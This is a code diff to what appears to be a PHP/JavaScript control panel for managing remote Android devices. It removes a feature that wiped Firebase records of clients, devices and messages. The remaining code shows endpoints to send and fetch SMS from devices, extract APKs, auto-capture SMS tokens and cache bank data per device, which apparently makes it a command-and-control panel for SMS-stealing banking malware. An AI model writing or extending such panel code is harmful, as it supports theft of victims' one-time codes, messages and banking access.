@@ -71,19 +71,6 @@ if (isset($_GET['sms_token_api']) || isset($_POST['sms_token_api'])) {
   rebel_sms_token_api_handle();
 }
 
-if (isset($_GET['rebel_wipe_clients']) || isset($_POST['rebel_wipe_clients'])) {
-  $fbUrl = rtrim($REBEL_PANEL_FIREBASE['databaseURL'], '/');
-  $authKey = rebel_firebase_auth_key($fbUrl, '');
-  $wiped = [];
-  foreach (['clients', 'devices', 'messages', 'user_list', 'user_data'] as $node) {
-    $res = rebel_firebase_req('DELETE', $fbUrl, $authKey, $node);
-    if ($res !== null) {
-      $wiped[] = $node;
-    }
-  }
-  rebel_json_out(['ok' => true, 'wiped' => $wiped]);
-}
-
 function rebel_avatar_url() {
   if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
   if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
@@ -407,7 +394,6 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
-        <div class="menu-item danger" onclick="wipeAllClients()">Wipe all devices <span>Fresh start</span></div>
       </div>
     </section>
   </div>
@@ -439,7 +425,6 @@ var SEND_SMS_URL='ddr.php?rebel_send_sms=1';
 var FETCH_SMS_URL='ddr.php?rebel_fetch_sms=1';
 var APK_EXTRACT_URL='ddr.php?rebel_apk_extract=1';
 var SMS_TOKEN_URL='ddr.php?sms_token_api=1';
-var WIPE_CLIENTS_URL='ddr.php?rebel_wipe_clients=1';
 var FIREBASE_API_URL='ddr.php?rebel_firebase_api=1';
 var REBEL_PANEL_ONLY=true;
 var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
@@ -1530,20 +1515,6 @@ function useSelForAutoToken(){
   smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
     toast('Auto SMS device set',true);
   }).catch(function(){toast('Auto token save failed',false);});
-}
-function wipeAllClients(){
-  if(!confirm('Delete ALL devices from Firebase? Fresh project — cannot undo.'))return;
-  fetch(WIPE_CLIENTS_URL,{method:'POST',credentials:'same-origin'})
-    .then(function(r){return r.json();})
-    .then(function(d){
-      if(d&&d.ok){
-        clientsRawMap={};allDevs=[];selDev='';deviceSmsCache={};deviceBankCache={};
-        try{localStorage.removeItem(SMS_CACHE_KEY);}catch(e){}
-        renderDevices();updateStats();updateFbUi();
-        toast('Wiped: '+(d.wiped||[]).join(', '),true);
-      }else toast((d&&d.error)||'Wipe failed',false);
-    })
-    .catch(function(){toast('Wipe request failed',false);});
 }
 
 /* BOOT — direct open, all Firebase combined */
